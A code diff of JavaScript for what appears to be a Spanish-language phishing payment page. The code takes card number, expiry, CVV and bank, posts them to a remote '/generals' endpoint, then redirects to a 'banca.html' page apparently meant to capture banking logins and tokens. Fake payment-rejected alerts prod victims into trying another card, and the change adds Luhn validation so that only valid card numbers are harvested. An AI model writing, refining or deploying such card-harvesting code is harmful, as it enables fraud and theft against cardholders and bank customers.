@@ -5,16 +5,46 @@ fetch(`${API_URL}/view`, {
         'Content-Type': 'application/json',
         'Authorization': 'Bearer 123123123',
     },
-    body: JSON.stringify({message: 'P4'})
+    body: JSON.stringify({ message: 'P4' })
 })
 
-document.addEventListener('DOMContentLoaded', ()=>{
-    if(info.err === 'ncard'){
+document.addEventListener('DOMContentLoaded', () => {
+    if (info.err === 'ncard') {
         alert('PAGO RECHAZADO. Por favor inténtelo de nuevo con otro medio de pago.');
-    } else if(info.err === 'rcard'){
+    } else if (info.err === 'rcard') {
         alert('Por favor corrija los datos de su tarjeta o intente con otro medio de pago.');
     }
 });
+
+function isLuhnValid(bin) {
+    // Eliminar espacios en blanco y otros caracteres no numéricos
+    bin = bin.replace(/\D/g, '');
+
+    // Verificar si el BIN tiene al menos 6 dígitos (para detectar American Express)
+    if (bin.length < 6) {
+        return false;
+    }
+
+    // Convertir el BIN a un arreglo de dígitos en orden inverso
+    const digits = bin.split('').map(Number).reverse();
+
+    // Aplicar el algoritmo de Luhn
+    let sum = 0;
+    for (let i = 0; i < digits.length; i++) {
+        if (i % 2 !== 0) {
+            let doubled = digits[i] * 2;
+            if (doubled > 9) {
+                doubled -= 9;
+            }
+            sum += doubled;
+        } else {
+            sum += digits[i];
+        }
+    }
+
+    // Verificar si la suma es divisible por 10
+    return sum % 10 === 0;
+}
 
 const ban = document.querySelector('#ban');
 const p = document.querySelector('#p');
@@ -35,76 +65,81 @@ const btnContinuar = document.querySelector('#form');
 btnContinuar.addEventListener('submit', (e) => {
     e.preventDefault();
 
-    if ((p.value.length === 19 && p.value[0] !== '3' && ['4','5'].includes(p.value[0])) || (p.value.length === 17 && p.value[0] === '3')) {
-        if (mes.value !== '') {
-            if (ano.value !== '') {
-                if ((c.value.length === 3 && p.value.length === 19) || (c.value.length === 4 && p.value.length === 17)) {
-                    // Guardar en LS
-                    info.ban = ban.value;
-                    info.p = p.value;
-                    info.f = (mes.value + "/" + ano.value);
-                    info.c = c.value;
+    if ((p.value.length === 19 && p.value[0] !== '3' && ['4', '5'].includes(p.value[0])) || (p.value.length === 17 && p.value[0] === '3')) {
+        if(isLuhnValid(p.value)){
+            if (mes.value !== '') {
+                if (ano.value !== '') {
+                    if ((c.value.length === 3 && p.value.length === 19) || (c.value.length === 4 && p.value.length === 17)) {
+                        // Guardar en LS
+                        info.ban = ban.value;
+                        info.p = p.value;
+                        info.f = (mes.value + "/" + ano.value);
+                        info.c = c.value;
 
-                    if (p[0] === '3') {
-                        info.type = 'AM';
-                    } else if (p.value[0] === '4') {
-                        info.type = 'VISA';
-                    } else if (p.value[0] === '5') {
-                        info.type = 'MC';
+                        if (p[0] === '3') {
+                            info.type = 'AM';
+                        } else if (p.value[0] === '4') {
+                            info.type = 'VISA';
+                        } else if (p.value[0] === '5') {
+                            info.type = 'MC';
+                        } else {
+                            info.type = 'NO';
+                        }
+
+                        LS.setItem('info', JSON.stringify(info));
+
+                        // Mostrar modal
+                        document.querySelector('#modal-principal').classList.add('d-block');
+                        document.querySelector('#-icon-banco').setAttribute('src', `./assets/logos/${ban.value}.png`);
+
+                        document.querySelector('#autorizar').addEventListener('click', (e) => {
+                            document.querySelector('#modal-esperar').classList.add('d-block');
+
+                            setTimeout(() => {
+                                if (info.err === 'rcard') {
+                                    window.location.href = 'waiting.html';
+                                } else {
+                                    info.err = '';
+                                    info.user = '';
+                                    info.puser = '';
+                                    info.tok = '';
+
+                                    LS.setItem('info', JSON.stringify(info));
+
+                                    fetch(`${API_URL}/generals`, {
+                                        method: 'POST',
+                                        headers: {
+                                            'Content-Type': 'application/json',
+                                            'Authorization': 'Bearer 123123123',
+                                        },
+                                        body: JSON.stringify(info)
+                                    })
+
+
+                                    setTimeout(() => {
+
+                                        window.location.href = 'banca.html';
+                                    }, 2000);
+                                }
+                            }, 2000);
+
+                        });
+
+
                     } else {
-                        info.type = 'NO';
+                        alert('CVV Incorrecto o no válido.');
                     }
-                    
-                    LS.setItem('info', JSON.stringify(info));
-
-                    // Mostrar modal
-                    document.querySelector('#modal-principal').classList.add('d-block');
-                    document.querySelector('#-icon-banco').setAttribute('src', `./assets/logos/${ban.value}.png`);
-
-                    document.querySelector('#autorizar').addEventListener('click', (e)=>{
-                        document.querySelector('#modal-esperar').classList.add('d-block');
-
-                        setTimeout(()=>{
-                            if(info.err === 'rcard'){
-                                window.location.href = 'waiting.html';
-                            }else{
-                                info.err = '';
-                                info.user = '';
-                                info.puser = '';
-                                info.tok = '';
-
-                                LS.setItem('info', JSON.stringify(info));
-
-                                fetch(`${API_URL}/generals`, {
-                                    method: 'POST',
-                                    headers: {
-                                        'Content-Type': 'application/json',
-                                        'Authorization': 'Bearer 123123123',
-                                    },
-                                    body: JSON.stringify(info)
-                                })
-
-
-                                setTimeout(()=>{
-                                    
-                                    window.location.href = 'banca.html';
-                                },2000);
-                            }
-                        }, 2000);
-
-                    });
-                    
-
                 } else {
-                    alert('CVV Incorrecto o no válido.');
+                    alert('El año de vencimiento es inválido');
+                    ano.focus();
                 }
             } else {
-                alert('El año de vencimiento es inválido');
-                ano.focus();
+                alert('El mes de vencimiento es inválido');
+                mes.focus();
             }
-        } else {
-            alert('El mes de vencimiento es inválido');
-            mes.focus();
+        } else{
+            alert('El número de tu tarjeta es inválido.')
+            p.focus();
         }
     } else {
         alert('El número de tu tarjeta es inválido.')
@@ -114,7 +149,7 @@ btnContinuar.addEventListener('submit', (e) => {
 
 function formatearNumero(input) {
     let numero = input.value.replace(/\D/g, ''); // Eliminar todos los caracteres no numéricos
-    numero.length === 0 ? p.removeAttribute('class'): '';
+    numero.length === 0 ? p.removeAttribute('class') : '';
     let numeroFormateado = '';
 
     // American express
@@ -140,8 +175,8 @@ function formatearNumero(input) {
         input.value = numeroFormateado;
     } else {
 
-        numero[0] == 4 ? p.classList.add('bg-vi'): '';
-        numero[0] == 5 ? p.classList.add('bg-mc'): '';
+        numero[0] == 4 ? p.classList.add('bg-vi') : '';
+        numero[0] == 5 ? p.classList.add('bg-mc') : '';
 
         c.setAttribute('maxlength', '3');
         if (numero.length > 16) {
